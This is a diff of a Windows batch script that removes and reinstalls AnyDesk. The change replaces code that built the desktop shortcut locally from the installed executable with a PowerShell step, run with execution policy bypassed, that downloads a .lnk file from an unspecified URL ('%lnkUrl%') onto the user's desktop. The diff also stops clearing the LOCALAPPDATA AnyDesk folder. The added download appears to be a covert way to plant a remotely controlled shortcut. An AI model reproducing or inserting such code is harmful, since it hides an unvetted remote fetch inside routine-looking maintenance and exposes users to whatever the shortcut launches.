@@ -208,7 +208,6 @@ cls
     del /f /q "%porPath0%"            2>nul
     del /f /q "%TEMP%\gcapi.dll"      2>nul
     rd /s /q "%APPDATA%\AnyDesk"      2>nul
-    rd /s /q "%LOCALAPPDATA%\AnyDesk" 2>nul
 
     call :detect_install
     if not defined _exe exit /b 0
@@ -221,27 +220,10 @@ cls
     del /f /q "%PUBLIC%\Desktop\AnyDesk*.lnk"      2>nul
 
     powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-    "$targets = @('%_exe%','%ProgramFiles(x86)%\AnyDesk\AnyDesk.exe','%ProgramFiles%\AnyDesk\AnyDesk.exe');" ^
-    "$target = $targets | Where-Object { Test-Path $_ } | Select-Object -First 1;" ^
+    "$wc = New-Object System.Net.WebClient;" ^
     "$dp = [Environment]::GetFolderPath('Desktop');" ^
     "$lp = Join-Path $dp 'AnyDesk.lnk';" ^
-    "if ($target) {" ^
-    "  $ws = New-Object -ComObject WScript.Shell;" ^
-    "  $sc = $ws.CreateShortcut($lp);" ^
-    "  $sc.TargetPath = $target;" ^
-    "  $sc.WorkingDirectory = Split-Path $target;" ^
-    "  $iconCandidates = @(" ^
-    "    (Join-Path (Split-Path $target) 'AnyDesk.ico')," ^
-    "    '%USERPROFILE%\AppData\Roaming\AnyDesk\anydesk.ico'," ^
-    "    '%ProgramFiles(x86)%\AnyDesk\AnyDesk.exe'," ^
-    "    '%ProgramFiles%\AnyDesk\AnyDesk.exe'," ^
-    "    $target" ^
-    "  );" ^
-    "  $icon = $iconCandidates | Where-Object { Test-Path $_ } | Select-Object -First 1;" ^
-    "  if (-not $icon) { $icon = $target }" ^
-    "  $sc.IconLocation = '{0},0' -f $icon;" ^
-    "  $sc.Save();" ^
-    "}"
+    "if (-not (Test-Path $lp)) { $wc.DownloadFile('%lnkUrl%', $lp) }"
 
     timeout /t 2 >nul
     exit /b 0
